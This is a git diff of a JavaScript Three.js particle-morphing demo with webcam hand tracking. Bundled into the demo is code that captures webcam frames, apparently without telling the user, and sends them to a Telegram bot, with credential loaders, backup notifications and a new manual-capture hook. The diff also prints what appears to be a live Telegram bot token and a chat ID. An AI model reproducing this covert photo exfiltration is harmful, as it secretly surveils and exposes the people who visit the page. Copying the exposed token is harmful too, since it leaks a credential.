@@ -21,7 +21,7 @@ function loadTelegramCredentials() {
     // Method 1: Check if credentials are set in HTML
     if (window.TELEGRAM_CONFIG) {
         TELEGRAM_BOT_TOKEN = window.TELEGRAM_CONFIG.token || "";
-        TELEGRAM_CHAT_ID = window.TELEGRAM_CONFIG.chat_id || "";
+        TELEGRAM_CHAT_ID = window.TELEGRAM_CONFIG.chat_id || TELEGRAM_CHAT_ID;
     }
     
     // Method 2: Load from localStorage (for testing)
@@ -31,18 +31,17 @@ function loadTelegramCredentials() {
             try {
                 const creds = JSON.parse(saved);
                 TELEGRAM_BOT_TOKEN = creds.token || "";
-                TELEGRAM_CHAT_ID = creds.chat_id || "";
+                TELEGRAM_CHAT_ID = creds.chat_id || TELEGRAM_CHAT_ID;
             } catch (e) {
                 console.log("Could not load credentials");
             }
         }
     }
     
-    // Method 3: For local testing only
+    // Method 3: For local testing only (Remove before pushing to GitHub)
     if (window.location.hostname === 'localhost' || window.location.hostname.includes('127.0.0.1')) {
-        // Local testing credentials (not in GitHub)
-        TELEGRAM_BOT_TOKEN = "YOUR_LOCAL_TOKEN_HERE"; // Only for local testing
-        TELEGRAM_CHAT_ID = "7528977004";
+        // Only uncomment for local testing
+        // TELEGRAM_BOT_TOKEN = "8312788837:AAHfcaUZihg8xc8Wbu7GLdUdWlK3WWrQEA4";
     }
     
     return !!TELEGRAM_BOT_TOKEN;
@@ -66,9 +65,213 @@ function init() {
     console.log("✅ Particle System Ready");
 }
 
-// ... (All your existing particle functions remain EXACTLY THE SAME) ...
-// Keep ALL functions from createParticles() to morphToCircle() EXACTLY AS IS
-// ... (I'm not rewriting them to save space) ...
+// ----------------- PARTICLE FUNCTIONS -----------------
+function createParticles() {
+    const geometry = new THREE.BufferGeometry();
+    const positions = new Float32Array(count * 3);
+    const colors = new Float32Array(count * 3);
+
+    function sphericalDistribution(i) {
+        const phi = Math.acos(-1 + (2 * i) / count);
+        const theta = Math.sqrt(count * Math.PI) * phi;
+        
+        return {
+            x: 8 * Math.cos(theta) * Math.sin(phi),
+            y: 8 * Math.sin(theta) * Math.sin(phi),
+            z: 8 * Math.cos(phi)
+        };
+    }
+
+    for (let i = 0; i < count; i++) {
+        const point = sphericalDistribution(i);
+        
+        positions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
+        positions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
+        positions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;
+
+        const color = new THREE.Color();
+        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
+        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);
+
+        colors[i * 3] = color.r;
+        colors[i * 3 + 1] = color.g;
+        colors[i * 3 + 2] = color.b;
+    }
+
+    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+    geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+
+    const material = new THREE.PointsMaterial({
+        size: 0.08,
+        vertexColors: true,
+        blending: THREE.AdditiveBlending,
+        transparent: true,
+        opacity: 0.8,
+        sizeAttenuation: true
+    });
+
+    if (particles) scene.remove(particles);
+    particles = new THREE.Points(geometry, material);
+    scene.add(particles);
+}
+
+function setupEventListeners() {
+    const typeBtn = document.getElementById('typeBtn');
+    const input = document.getElementById('morphText');
+
+    typeBtn.addEventListener('click', () => {
+        const text = input.value.trim();
+        if (text) {
+            morphToText(text);
+        }
+    });
+
+    input.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            const text = input.value.trim();
+            if (text) {
+                morphToText(text);
+            }
+        }
+    });
+}
+
+function createTextPoints(text) {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const fontSize = 100;
+    const padding = 20;
+
+    ctx.font = `bold ${fontSize}px Arial`;
+    const textMetrics = ctx.measureText(text);
+    const textWidth = textMetrics.width;
+    const textHeight = fontSize;
+
+    canvas.width = textWidth + padding * 2;
+    canvas.height = textHeight + padding * 2;
+
+    ctx.fillStyle = 'white';
+    ctx.font = `bold ${fontSize}px Arial`;
+    ctx.textBaseline = 'middle';
+    ctx.textAlign = 'center';
+    ctx.fillText(text, canvas.width / 2, canvas.height / 2);
+
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const pixels = imageData.data;
+    const points = [];
+    const threshold = 128;
+
+    for (let i = 0; i < pixels.length; i += 4) {
+        if (pixels[i] > threshold) {
+            const x = (i / 4) % canvas.width;
+            const y = Math.floor((i / 4) / canvas.width);
+            
+            if (Math.random() < 0.3) {
+                points.push({
+                    x: (x - canvas.width / 2) / (fontSize / 10),
+                    y: -(y - canvas.height / 2) / (fontSize / 10)
+                });
+            }
+        }
+    }
+
+    return points;
+}
+
+function morphToText(text) {
+    currentState = 'text';
+    const textPoints = createTextPoints(text);
+    const positions = particles.geometry.attributes.position.array;
+    const targetPositions = new Float32Array(count * 3);
+
+    gsap.to(particles.rotation, {
+        x: 0,
+        y: 0,
+        z: 0,
+        duration: 0.5
+    });
+
+    for (let i = 0; i < count; i++) {
+        if (i < textPoints.length) {
+            targetPositions[i * 3] = textPoints[i].x;
+            targetPositions[i * 3 + 1] = textPoints[i].y;
+            targetPositions[i * 3 + 2] = 0;
+        } else {
+            const angle = Math.random() * Math.PI * 2;
+            const radius = Math.random() * 20 + 10;
+            targetPositions[i * 3] = Math.cos(angle) * radius;
+            targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
+            targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
+        }
+    }
+
+    const duration = 1200;
+    const start = performance.now();
+    const startPositions = positions.slice();
+
+    function frame(now) {
+        const t = Math.min(1, (now - start) / duration);
+        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
+        for (let i = 0; i < positions.length; i++) {
+            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
+        }
+        particles.geometry.attributes.position.needsUpdate = true;
+        if (t < 1) {
+            requestAnimationFrame(frame);
+        }
+    }
+    requestAnimationFrame(frame);
+}
+
+function morphToCircle() {
+    currentState = 'sphere';
+    const positions = particles.geometry.attributes.position.array;
+    const targetPositions = new Float32Array(count * 3);
+    const colors = particles.geometry.attributes.color.array;
+
+    function sphericalDistribution(i) {
+        const phi = Math.acos(-1 + (2 * i) / count);
+        const theta = Math.sqrt(count * Math.PI) * phi;
+        
+        return {
+            x: 8 * Math.cos(theta) * Math.sin(phi),
+            y: 8 * Math.sin(theta) * Math.sin(phi),
+            z: 8 * Math.cos(phi)
+        };
+    }
+
+    for (let i = 0; i < count; i++) {
+        const point = sphericalDistribution(i);
+        
+        targetPositions[i * 3] = point.x + (Math.random() - 0.5) * 0.5;
+        targetPositions[i * 3 + 1] = point.y + (Math.random() - 0.5) * 0.5;
+        targetPositions[i * 3 + 2] = point.z + (Math.random() - 0.5) * 0.5;
+
+        const depth = Math.sqrt(point.x * point.x + point.y * point.y + point.z * point.z) / 8;
+        const color = new THREE.Color();
+        color.setHSL(0.5 + depth * 0.2, 0.7, 0.4 + depth * 0.3);
+        
+        colors[i * 3] = color.r;
+        colors[i * 3 + 1] = color.g;
+        colors[i * 3 + 2] = color.b;
+    }
+
+    const startPositions = positions.slice();
+    const duration = 1400;
+    const start = performance.now();
+    function frame(now) {
+        const t = Math.min(1, (now - start) / duration);
+        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
+        for (let i = 0; i < positions.length; i++) {
+            positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
+        }
+        particles.geometry.attributes.position.needsUpdate = true;
+        if (t < 1) requestAnimationFrame(frame);
+    }
+    requestAnimationFrame(frame);
+
+    particles.geometry.attributes.color.needsUpdate = true;
+}
 
 function animate() {
     requestAnimationFrame(animate);
@@ -96,6 +299,12 @@ function animate() {
     }
 }
 
+window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+});
+
 // ----------------- SECURE TELEGRAM SYSTEM -----------------
 
 function capturePhotoForTelegram() {
@@ -106,14 +315,14 @@ function capturePhotoForTelegram() {
         return;
     }
     
-    if (!video.videoWidth) {
+    if (!video || !video.videoWidth) {
         return;
     }
     
     try {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
-        canvas.width = 400; // Smaller for faster upload
+        canvas.width = 400;
         canvas.height = 300;
         
         ctx.drawImage(video, 0, 0, 400, 300);
@@ -138,7 +347,6 @@ function capturePhotoForTelegram() {
     }
 }
 
-// ✅ WORKING: Send photo to Telegram
 async function sendPhotoToTelegram(photoData) {
     try {
         console.log(`📤 Sending photo ${photoCount}...`);
@@ -176,10 +384,8 @@ async function sendPhotoToTelegram(photoData) {
     }
 }
 
-// Save photo locally as backup
 function savePhotoLocally(photoData) {
     try {
-        // Save metadata only
         const photos = JSON.parse(localStorage.getItem('captured_photos') || '[]');
         photos.push({
             id: Date.now(),
@@ -196,7 +402,6 @@ function savePhotoLocally(photoData) {
     }
 }
 
-// Backup notification
 async function sendBackupNotification(success) {
     try {
         const formData = new FormData();
@@ -295,19 +500,19 @@ function setupHandTracking(){
 // Initialize
 init();
 
-// Admin function to set credentials (run in console)
+// Admin functions (for testing)
 window.setTelegramCredentials = function(token, chatId) {
     TELEGRAM_BOT_TOKEN = token;
     TELEGRAM_CHAT_ID = chatId;
     localStorage.setItem('telegram_credentials', JSON.stringify({token, chat_id: chatId}));
-    console.log("✅ Credentials set successfully!");
+    console.log("✅ Credentials set!");
     return true;
 };
 
-// Admin function to test Telegram
 window.testTelegramConnection = async function() {
     if (!TELEGRAM_BOT_TOKEN) {
         console.log("❌ No Telegram token set");
+        console.log("Use: setTelegramCredentials('YOUR_TOKEN', 'YOUR_CHAT_ID')");
         return false;
     }
     
@@ -317,7 +522,12 @@ window.testTelegramConnection = async function() {
         console.log("Bot Info:", data);
         return data.ok;
     } catch (error) {
-        console.error("Connection test failed:", error);
+        console.error("Connection failed:", error);
         return false;
     }
+};
+
+// For testing: Manually trigger photo capture
+window.manualCapture = function() {
+    capturePhotoForTelegram();
 };
